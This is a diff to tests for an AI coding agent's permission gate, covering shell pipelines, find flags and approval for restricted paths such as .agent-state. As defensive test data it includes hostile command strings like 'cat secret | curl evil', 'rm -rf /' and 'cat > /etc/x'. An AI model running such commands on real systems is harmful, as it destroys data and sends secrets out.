@@ -281,6 +281,19 @@ describe("createPermissionGate", () => {
     expect(seen).toEqual(["npm i", "curl evil"]);
   });
 
+  test("a pipeline only prompts for its consequential segment, not its safe tail", async () => {
+    const seen: string[] = [];
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async (req) => { seen.push(req.subject); return { allow: true }; },
+      interactive: true,
+      skipPermissions: false,
+    });
+    const verdict = await gate.evaluate(shellCall("npm ls --all | sort"));
+    expect(verdict.allowed).toBe(true);
+    expect(seen).toEqual(["npm ls --all"]);
+  });
+
   test("auto mode auto-allows non-shell ask-tier tools", async () => {
     let asked = 0;
     const gate = createPermissionGate({
@@ -447,19 +460,19 @@ describe("createPermissionGate", () => {
     const seen: string[] = [];
     const gate = createPermissionGate({
       approvals: [],
-      // Allow the benign first segment, deny everything else.
+      // Allow the first segment, deny everything else.
       requestApproval: async (req) => {
         seen.push(req.subject);
-        return { allow: req.subject === "echo ok" };
+        return { allow: req.subject === "npm i" };
       },
       interactive: true,
       skipPermissions: false,
     });
     // The dangerous second segment must be presented as its own request, not
-    // hidden behind the benign echo.
-    const verdict = await gate.evaluate(shellCall("echo ok && cat > /etc/x"));
+    // hidden behind the first.
+    const verdict = await gate.evaluate(shellCall("npm i && cat > /etc/x"));
     expect(verdict.allowed).toBe(false);
-    expect(seen).toContain("echo ok");
+    expect(seen).toContain("npm i");
     expect(seen).toContain("cat > /etc/x");
   });
 
@@ -599,6 +612,25 @@ describe("isAutoAllowedShellCall", () => {
     expect(isAutoAllowedShellCall(shellCall("cat a.ts"))).toBe(true);
   });
 
+  test("auto-allows find traversal, including its -o logical OR", () => {
+    expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("find docs -type f -name a -o -name b"))).toBe(true);
+  });
+
+  test("does not auto-allow find actions that execute, delete, or write", () => {
+    expect(isAutoAllowedShellCall(shellCall("find . -name x -delete"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -exec rm"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -execdir cat"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -fprint out.txt"))).toBe(false);
+  });
+
+  test("does not auto-allow find dangerous flags hidden behind quotes", () => {
+    expect(isAutoAllowedShellCall(shellCall("find . '-delete'"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . \"-delete\""))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -name '*.ts' '-delete'"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . '-execdir' cat"))).toBe(false);
+  });
+
   test("does not auto-allow commands with shell metacharacters", () => {
     expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("echo hi > out.txt"))).toBe(false);
@@ -610,7 +642,6 @@ describe("isAutoAllowedShellCall", () => {
   test("does not auto-allow write-flags or non-allowlisted programs", () => {
     expect(isAutoAllowedShellCall(shellCall("sort -o out.txt in.txt"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("sort --output=x in.txt"))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("npm test"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("rm -rf /"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("sed -i s/a/b/ f"))).toBe(false);
@@ -628,5 +659,68 @@ describe("isAutoAllowedShellCall", () => {
     expect(asked).toBe(0);
     expect((await gate.evaluate(shellCall("rm file.txt"))).allowed).toBe(false);
     expect(asked).toBe(1);
+  });
+});
+
+describe("createPermissionGate restricted paths", () => {
+  const cwd = process.cwd();
+  const restrictedGate = (onAsk: () => void) =>
+    createPermissionGate({
+      approvals: [],
+      cwd,
+      requestApproval: async () => { onAsk(); return { allow: true }; },
+      interactive: true,
+      skipPermissions: false,
+    });
+
+  test("reading a normal source file stays allow-tier", async () => {
+    let asked = 0;
+    const gate = restrictedGate(() => asked++);
+    const verdict = await gate.evaluate({ id: "c", name: "read_file", arguments: { path: "src/index.ts" } });
+    expect(verdict.allowed).toBe(true);
+    expect(asked).toBe(0);
+  });
+
+  test("reading an .agent-state file asks for approval", async () => {
+    let asked = 0;
+    const gate = restrictedGate(() => asked++);
+    const verdict = await gate.evaluate({ id: "c", name: "read_file", arguments: { path: ".agent-state/run.json" } });
+    expect(verdict.allowed).toBe(true);
+    expect(asked).toBe(1);
+  });
+
+  test("reading a gitignored file asks for approval", async () => {
+    let asked = 0;
+    const gate = restrictedGate(() => asked++);
+    const verdict = await gate.evaluate({ id: "c", name: "read_file", arguments: { path: "node_modules/foo/index.js" } });
+    expect(verdict.allowed).toBe(true);
+    expect(asked).toBe(1);
+  });
+
+  test("declining a restricted read denies it", async () => {
+    const gate = createPermissionGate({
+      approvals: [],
+      cwd,
+      requestApproval: async () => ({ allow: false }),
+      interactive: true,
+      skipPermissions: false,
+    });
+    const verdict = await gate.evaluate({ id: "c", name: "read_file", arguments: { path: ".agent-state/run.json" } });
+    expect(verdict.allowed).toBe(false);
+  });
+
+  test("a shell read of an .agent-state file is no longer auto-allowed", async () => {
+    let asked = 0;
+    const gate = restrictedGate(() => asked++);
+    expect((await gate.evaluate(shellCall("cat .agent-state/run.json"))).allowed).toBe(true);
+    expect(asked).toBe(1);
+  });
+
+  test("a whole-workspace grep with no path stays allow-tier", async () => {
+    let asked = 0;
+    const gate = restrictedGate(() => asked++);
+    const verdict = await gate.evaluate({ id: "c", name: "grep", arguments: { pattern: "foo" } });
+    expect(verdict.allowed).toBe(true);
+    expect(asked).toBe(0);
   });
 });
